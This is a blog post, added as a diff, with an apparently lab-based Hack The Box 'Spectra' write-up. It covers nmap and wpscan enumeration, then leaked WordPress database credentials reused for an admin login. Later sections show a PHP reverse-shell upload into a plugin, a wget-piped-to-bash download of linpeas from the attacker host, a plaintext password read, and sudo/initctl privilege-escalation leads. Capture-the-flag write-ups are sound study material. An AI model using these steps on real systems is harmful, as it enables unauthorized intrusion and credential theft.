@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Spectra Write-Up | The Cyber Experiment</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Spectra Write-Up" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Scanning &amp; Enumeration I started with an nmap scan, which showed a few open port. It seems Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 09:58 EDT Nmap scan report for 10.10.10.229 Host is up (0.025s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesnt have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 8081/tcp open blackice-icecap? | fingerprint-strings: | FourOhFourRequest, GetRequest: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:19 GMT | Connection: close | Hello World | HTTPOptions: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:24 GMT | Connection: close |_ Hello World 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8081-TCP:V=7.91%I=7%D=4/24%Time=608423F9%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,71,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nD SF:ate:\x20Sat,\x2024\x20Apr\x202021\x2014:09:19\x20GMT\r\nConnection:\x20 SF:close\r\n\r\nHello\x20World\n&quot;)%r(FourOhFourRequest,71,&quot;HTTP/1\.1\x2020 SF:0\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sat,\x2024\x20Apr\x2 SF:02021\x2014:09:19\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\ SF:n&quot;)%r(HTTPOptions,71,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/p SF:lain\r\nDate:\x20Sat,\x2024\x20Apr\x202021\x2014:09:24\x20GMT\r\nConnec SF:tion:\x20close\r\n\r\nHello\x20World\n&quot;);" />
+<meta property="og:description" content="Scanning &amp; Enumeration I started with an nmap scan, which showed a few open port. It seems Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 09:58 EDT Nmap scan report for 10.10.10.229 Host is up (0.025s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesnt have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 8081/tcp open blackice-icecap? | fingerprint-strings: | FourOhFourRequest, GetRequest: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:19 GMT | Connection: close | Hello World | HTTPOptions: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:24 GMT | Connection: close |_ Hello World 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8081-TCP:V=7.91%I=7%D=4/24%Time=608423F9%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,71,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nD SF:ate:\x20Sat,\x2024\x20Apr\x202021\x2014:09:19\x20GMT\r\nConnection:\x20 SF:close\r\n\r\nHello\x20World\n&quot;)%r(FourOhFourRequest,71,&quot;HTTP/1\.1\x2020 SF:0\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sat,\x2024\x20Apr\x2 SF:02021\x2014:09:19\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\ SF:n&quot;)%r(HTTPOptions,71,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/p SF:lain\r\nDate:\x20Sat,\x2024\x20Apr\x202021\x2014:09:24\x20GMT\r\nConnec SF:tion:\x20close\r\n\r\nHello\x20World\n&quot;);" />
+<link rel="canonical" href="/htb/spectra" />
+<meta property="og:url" content="/htb/spectra" />
+<meta property="og:site_name" content="The Cyber Experiment" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-24T23:20:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Spectra Write-Up" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Spectra Write-Up","dateModified":"2021-04-24T23:20:00+02:00","url":"/htb/spectra","datePublished":"2021-04-24T23:20:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/spectra"},"description":"Scanning &amp; Enumeration I started with an nmap scan, which showed a few open port. It seems Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 09:58 EDT Nmap scan report for 10.10.10.229 Host is up (0.025s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesnt have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 8081/tcp open blackice-icecap? | fingerprint-strings: | FourOhFourRequest, GetRequest: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:19 GMT | Connection: close | Hello World | HTTPOptions: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:24 GMT | Connection: close |_ Hello World 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8081-TCP:V=7.91%I=7%D=4/24%Time=608423F9%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,71,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain\\r\\nD SF:ate:\\x20Sat,\\x2024\\x20Apr\\x202021\\x2014:09:19\\x20GMT\\r\\nConnection:\\x20 SF:close\\r\\n\\r\\nHello\\x20World\\n&quot;)%r(FourOhFourRequest,71,&quot;HTTP/1\\.1\\x2020 SF:0\\x20OK\\r\\nContent-Type:\\x20text/plain\\r\\nDate:\\x20Sat,\\x2024\\x20Apr\\x2 SF:02021\\x2014:09:19\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nHello\\x20World\\ SF:n&quot;)%r(HTTPOptions,71,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Type:\\x20text/p SF:lain\\r\\nDate:\\x20Sat,\\x2024\\x20Apr\\x202021\\x2014:09:24\\x20GMT\\r\\nConnec SF:tion:\\x20close\\r\\n\\r\\nHello\\x20World\\n&quot;);","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="The Cyber Experiment" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">The Cyber Experiment</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Spectra Write-Up</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-24T23:20:00+02:00" itemprop="datePublished">Apr 24, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
+<p>I started with an nmap scan, which showed a few open port. It seems</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-24 09:58 EDT
+Nmap scan report <span class="k">for </span>10.10.10.229
+Host is up <span class="o">(</span>0.025s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 closed ports
+PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a <span class="o">(</span>RSA<span class="o">)</span>
+80/tcp   open  http             nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+3306/tcp open  mysql            MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+|_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ssl-date: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_sslv2: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_tls-alpn: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_tls-nextprotoneg: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+8081/tcp open  blackice-icecap?
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain
+|     Date: Sat, 24 Apr 2021 14:09:19 GMT
+|     Connection: close
+|     Hello World
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain
+|     Date: Sat, 24 Apr 2021 14:09:24 GMT
+|     Connection: close
+|_    Hello World
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8081-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>4/24%Time<span class="o">=</span>608423F9%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
+SF:tRequest,71,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain</span><span class="se">\r\n</span><span class="s2">D
+SF:ate:</span><span class="se">\x</span><span class="s2">20Sat,</span><span class="se">\x</span><span class="s2">2024</span><span class="se">\x</span><span class="s2">20Apr</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2014:09:19</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20
+SF:close</span><span class="se">\r\n\r\n</span><span class="s2">Hello</span><span class="se">\x</span><span class="s2">20World</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,71,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">2020
+SF:0</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Sat,</span><span class="se">\x</span><span class="s2">2024</span><span class="se">\x</span><span class="s2">20Apr</span><span class="se">\x</span><span class="s2">2
+SF:02021</span><span class="se">\x</span><span class="s2">2014:09:19</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">Hello</span><span class="se">\x</span><span class="s2">20World</span><span class="se">\</span><span class="s2">
+SF:n"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,71,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/p
+SF:lain</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Sat,</span><span class="se">\x</span><span class="s2">2024</span><span class="se">\x</span><span class="s2">20Apr</span><span class="se">\x</span><span class="s2">202021</span><span class="se">\x</span><span class="s2">2014:09:24</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Connec
+SF:tion:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">Hello</span><span class="se">\x</span><span class="s2">20World</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>By checking port 3306 manually I find that I am not allowed to access it from my current IP. Lets revisit this if I can find a ssrf vulnerability or gained foothold on the machine.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.10.229 3306
+
+Host <span class="s1">'10.10.14.104'</span> is not allowed to connect to this MySQL server
+</code></pre></div></div>
+
+<h2 id="enumerating-the-web-application">Enumerating the Web Application</h2>
+<p>I first went to port 80 and was greeted with a very basic webpage. The webpage did contain links using the hostname <code class="language-plaintext highlighter-rouge">spectra.htb</code>; so I added that to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p><img src="/assets/htb/spectra/port-80.png" alt="Homepage of port 80." /></p>
+
+<p>The link to the test url results in an error page claiming there was a database error. No I found no other interesting information here.</p>
+
+<h3 id="enumerating-wordpress">Enumerating Wordpress</h3>
+
+<p>The url <code class="language-plaintext highlighter-rouge">http://spectra.htb/main/</code> links to a wordpress website. I tried logging in with <code class="language-plaintext highlighter-rouge">admin:admin</code> on <code class="language-plaintext highlighter-rouge">http://spectra.htb/main/wp-login.php</code> and got an error message that the username is unknown. I may thus leverage this to enumerate users.</p>
+
+<p><img src="/assets/htb/spectra/wordpress-user-enum.png" alt="wordpress login error" /></p>
+
+<p>Clicking on the comment field I discover that the wordpress version is 5.4.2</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="nt">&lt;rss</span> <span class="na">version=</span><span class="s">"2.0"</span>
+	<span class="na">xmlns:content=</span><span class="s">"http://purl.org/rss/1.0/modules/content/"</span>
+	<span class="na">xmlns:dc=</span><span class="s">"http://purl.org/dc/elements/1.1/"</span>
+	<span class="na">xmlns:atom=</span><span class="s">"http://www.w3.org/2005/Atom"</span>
+	<span class="na">xmlns:sy=</span><span class="s">"http://purl.org/rss/1.0/modules/syndication/"</span>
+	
+	<span class="nt">&gt;</span>
+<span class="nt">&lt;channel&gt;</span>
+	<span class="nt">&lt;title&gt;</span>
+	Comments for Software Issue Management	<span class="nt">&lt;/title&gt;</span>
+	<span class="nt">&lt;atom:link</span> <span class="na">href=</span><span class="s">"http://spectra.htb/main/?feed=comments-rss2"</span> <span class="na">rel=</span><span class="s">"self"</span> <span class="na">type=</span><span class="s">"application/rss+xml"</span> <span class="nt">/&gt;</span>
+	<span class="nt">&lt;link&gt;</span>http://spectra.htb/main<span class="nt">&lt;/link&gt;</span>
+	<span class="nt">&lt;description&gt;</span>Just another WordPress site<span class="nt">&lt;/description&gt;</span>
+	<span class="nt">&lt;lastBuildDate&gt;</span>Mon, 29 Jun 2020 22:16:37 +0000<span class="nt">&lt;/lastBuildDate&gt;</span>
+	<span class="nt">&lt;sy:updatePeriod&gt;</span>
+	hourly	<span class="nt">&lt;/sy:updatePeriod&gt;</span>
+	<span class="nt">&lt;sy:updateFrequency&gt;</span>
+	1	<span class="nt">&lt;/sy:updateFrequency&gt;</span>
+	<span class="nt">&lt;generator&gt;</span>https://wordpress.org/?v=5.4.2<span class="nt">&lt;/generator&gt;</span>
+	<span class="nt">&lt;item&gt;</span>
+		<span class="nt">&lt;title&gt;</span>
+		Comment on Hello world! by A WordPress Commenter		<span class="nt">&lt;/title&gt;</span>
+		<span class="nt">&lt;link&gt;</span>http://spectra.htb/main/?p=1#comment-1<span class="nt">&lt;/link&gt;</span>
+
+		<span class="nt">&lt;dc:creator&gt;</span><span class="cp">&lt;![CDATA[A WordPress Commenter]]&gt;</span><span class="nt">&lt;/dc:creator&gt;</span>
+		<span class="nt">&lt;pubDate&gt;</span>Mon, 29 Jun 2020 22:16:37 +0000<span class="nt">&lt;/pubDate&gt;</span>
+		<span class="nt">&lt;guid</span> <span class="na">isPermaLink=</span><span class="s">"false"</span><span class="nt">&gt;</span>http://10.10.10.90/sites/dev/?p=1#comment-1<span class="nt">&lt;/guid&gt;</span>
+
+					<span class="nt">&lt;description&gt;</span><span class="cp">&lt;![CDATA[Hi, this is a comment.
+To get started with moderating, editing, and deleting comments, please visit the Comments screen in the dashboard.
+Commenter avatars come from &amp;lt;a href=&amp;quot;https://gravatar.com&amp;quot;&amp;gt;Gravatar&amp;lt;/a&amp;gt;.]]&gt;</span><span class="nt">&lt;/description&gt;</span>
+			<span class="nt">&lt;content:encoded&gt;</span><span class="cp">&lt;![CDATA[&lt;p&gt;</span>Hi, this is a comment.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+To get started with moderating, editing, and deleting comments, please visit the Comments screen in the dashboard.<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+Commenter avatars come from <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://gravatar.com"</span><span class="nt">&gt;</span>Gravatar<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;</span>
+]]&gt;<span class="nt">&lt;/content:encoded&gt;</span>
+		
+			<span class="nt">&lt;/item&gt;</span>
+	<span class="nt">&lt;/channel&gt;</span>
+<span class="nt">&lt;/rss&gt;</span>
+</code></pre></div></div>
+
+<p>And also lets launch a wpscan at the box to find usernames and plugins: <code class="language-plaintext highlighter-rouge">wpscan --url spectra.htb/main -e vp,u --plugins-detection aggressive --plugins-version-detection aggressive</code></p>
+
+<h2 id="dir-listing">Dir Listing</h2>
+<p><code class="language-plaintext highlighter-rouge">http://spectra.htb/testing</code>
+<code class="language-plaintext highlighter-rouge">http://spectra.htb/testing/wp-config.php.save</code></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="cd">/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */</span>
+
+<span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
+<span class="cd">/** The name of the database for WordPress */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'dev'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL database username */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'devtest'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL database password */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'devteam01'</span> <span class="p">);</span>
+
+<span class="cd">/** MySQL hostname */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
+
+<span class="cd">/** Database Charset to use in creating database tables. */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_CHARSET'</span><span class="p">,</span> <span class="s1">'utf8'</span> <span class="p">);</span>
+
+<span class="cd">/** The Database Collate type. Don't change this if in doubt. */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_COLLATE'</span><span class="p">,</span> <span class="s1">''</span> <span class="p">);</span>
+
+<span class="cd">/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_KEY'</span><span class="p">,</span>         <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_KEY'</span><span class="p">,</span>  <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_KEY'</span><span class="p">,</span>    <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_KEY'</span><span class="p">,</span>        <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_SALT'</span><span class="p">,</span>        <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_SALT'</span><span class="p">,</span> <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_SALT'</span><span class="p">,</span>   <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_SALT'</span><span class="p">,</span>       <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
+
+<span class="cd">/**#@-*/</span>
+
+<span class="cd">/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */</span>
+<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>
+
+<span class="cd">/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'WP_DEBUG'</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>
+
+<span class="cm">/* That's all, stop editing! Happy publishing. */</span>
+
+<span class="cd">/** Absolute path to the WordPress directory. */</span>
+<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">defined</span><span class="p">(</span> <span class="s1">'ABSPATH'</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+	<span class="nb">define</span><span class="p">(</span> <span class="s1">'ABSPATH'</span><span class="p">,</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cd">/** Sets up WordPress vars and included files. */</span>
+<span class="k">require_once</span> <span class="no">ABSPATH</span> <span class="mf">.</span> <span class="s1">'wp-settings.php'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Logging in with <code class="language-plaintext highlighter-rouge">administrator:devteam01</code></p>
+
+<p>revshell: http://pentestmonkey.net/tools/web-shells/php-reverse-shell</p>
+
+<p><img src="/assets/htb/spectra/plugin-web-shell.png" alt="Web shell uploaded in the akismet plugin." /></p>
+
+<h2 id="local-enumeration">Local Enumeration</h2>
+
+<p>Linpeas:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whereis wget
+wget: /usr/local/bin/wget
+<span class="nv">$ </span>/usr/local/bin/wget http://10.10.14.104:8000/linpeas.sh <span class="nt">-O</span> - | /bin/bash
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.3<span class="nv">$ </span><span class="nb">cat</span> /etc/autologin/passwd
+<span class="nb">cat</span> /etc/autologin/passwd
+SummerHereWeCome!!
+</code></pre></div></div>
+
+<h2 id="prive-esc">Prive Esc</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Checking <span class="s1">'sudo -l'</span>, /etc/sudoers, and /etc/sudoers.d
+<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+User katie may run the following commands on spectra:
+    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
+...[snip]...
+<span class="o">[</span>+] Interesting GROUP writable files <span class="o">(</span>not <span class="k">in </span>Home<span class="o">)</span> <span class="o">(</span>max 500<span class="o">)</span> 
+<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files 
+  Group katie:
+/tmp/screen
+  Group developers:
+/etc/init/test6.conf
+/etc/init/test7.conf
+/etc/init/test3.conf
+/etc/init/test4.conf
+/etc/init/test.conf 
+
+</code></pre></div></div>
+
+
+  </div><a class="u-url" href="/htb/spectra" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">The Cyber Experiment</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">The Cyber Experiment</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/the-cyber-experiment"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">the-cyber-experiment</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
